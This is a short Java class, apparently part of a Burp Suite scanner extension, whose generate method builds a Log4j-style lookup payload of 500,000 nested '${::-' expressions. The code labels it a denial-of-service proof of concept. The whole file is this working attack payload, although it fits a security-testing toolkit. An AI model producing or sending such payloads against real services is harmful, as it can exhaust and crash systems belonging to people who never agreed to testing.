package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC17 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${" + "${::-".repeat(500000) + "$${::-j}" + "}".repeat(500000) + "}";

    }

    @Override
    public int getType() {
        return POC_TYPE_DOS;
    }
}
